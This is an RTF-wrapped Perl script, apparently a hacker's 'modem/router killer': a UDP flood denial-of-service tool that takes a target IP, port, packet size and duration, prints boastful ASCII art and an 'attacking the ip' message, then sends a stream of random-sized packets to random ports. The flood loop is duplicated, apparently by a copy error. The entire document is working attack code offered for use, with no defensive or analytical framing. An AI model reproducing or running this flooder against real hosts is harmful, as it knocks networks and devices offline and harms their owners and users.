{\rtf1\ansi\ansicpg1252\cocoartf1265\cocoasubrtf190
{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\pardeftab720

\f0\fs26 \cf0 #!/usr/bin/perl\
\'a0\
##\
#!/usr/bin/perl\
\'a0\
use Socket;\
use strict;\
\'a0\
my ($ip,$port,$size,$time) = @ARGV;\
\'a0\
my ($iaddr,$endtime,$psize,$pport);\
\'a0\
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\\n";\
$endtime = time() + ($time ? $time : 100);\
socket(flood, PF_INET, SOCK_DGRAM, 17);\
\'a0\
\'a0\
print <<EOTEXT;\
\'a0 \'a0 \'a0\
\'a0 \'a0 \'a0\
\'a0 \'a0 \'a0\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0...\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0;::::; \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0DgH By Vibew Killed this Modem/Router!\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0;::::; :;\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0;:::::' \'a0 :;\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0 ;:::::; \'a0 \'a0 ;.\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0,:::::' \'a0 \'a0 \'a0 ; \'a0 \'a0 \'a0 \'a0 \'a0 OOO\\\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0::::::; \'a0 \'a0 \'a0 ; \'a0 \'a0 \'a0 \'a0 \'a0OOOOO\\\
\'a0 \'a0 \'a0 \'a0 \'a0 \'a0;:::::; \'a0 \'a0 \'a0 ; \'a0 \'a0 \'a0 \'a0 OOOOOOOO\
\'a0 \'a0 \'a0 \'a0 \'a0 ,;::::::; \'a0 \'a0 ;' \'a0 \'a0 \'a0 \'a0 / OOOOOOO\
\'a0 \'a0 \'a0 \'a0 ;:::::::::`. ,,,;. \'a0 \'a0 \'a0 \'a0/ \'a0/ DOOOOOO\
\'a0 \'a0 \'a0 .';:::::::::::::::::;, \'a0 \'a0 / \'a0/ \'a0 \'a0 DOOOO\
\'a0 \'a0 \'a0,::::::;::::::;;;;::::;, \'a0 / \'a0/ \'a0 \'a0 \'a0 \'a0DOOO\
\'a0 \'a0 ;`::::::`'::::::;;;::::: ,#/ \'a0/ \'a0 \'a0 \'a0 \'a0 \'a0DOOO\
\'a0 \'a0 :`:::::::`;::::::;;::: ;::# \'a0/ \'a0 \'a0 \'a0 \'a0 \'a0 \'a0DOOO\
\'a0 \'a0 ::`:::::::`;:::::::: ;::::# / \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0DOO\
\'a0 \'a0 `:`:::::::`;:::::: ;::::::#/ \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 DOO\
\'a0 \'a0 \'a0:::`:::::::`;; ;:::::::::## \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0OO\
\'a0 \'a0 \'a0::::`:::::::`;::::::::;:::# \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0OO\
\'a0 \'a0 \'a0`:::::`::::::::::::;'`:;::# \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0 \'a0O\
\'a0 \'a0 \'a0 `:::::`::::::::;' / \'a0/ `:#\
\'a0 \'a0 \'a0 \'a0::::::`:::::;' \'a0/ \'a0/ \'a0 `#\
EOTEXT\
\'a0 \'a0 \'a0\
print "~You are attacking the ip: $ip " . ($port ? $port : "random") . " With " .\
($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .\
($time ? "for $time seconds" : "") . "\\n";\
\'a0\'a0\
for (;time() <= $endtime;) \{\
$psize = $size ? $size : int(rand(1024-64)+64) ;\
$pport = $port ? $port : int(rand(65500))+1;\
\'a0 \'a0 \'a0\
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,\
$iaddr));\}for (;time() <= $endtime;) \{\
$psize = $size ? $size : int(rand(1024-64)+64) ;\
$pport = $port ? $port : int(rand(65500))+1;\
\'a0\
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,\
$iaddr));\}\
}